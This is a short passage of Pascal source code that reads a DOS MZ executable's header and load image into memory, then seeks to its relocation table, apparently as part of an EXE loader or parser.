        blockread(f, Addr(mz)^, sizeof(mz));
        Seek(F, mz.HeaderSize*16);
        size := FileSize(f)-mz.HeaderSize*16;
        GetMem(p, size);
        BlockRead(f, p^, size);
        Seek(f, mz.RelocTable);
        BlockRead(f, n, 2);      { ofs }
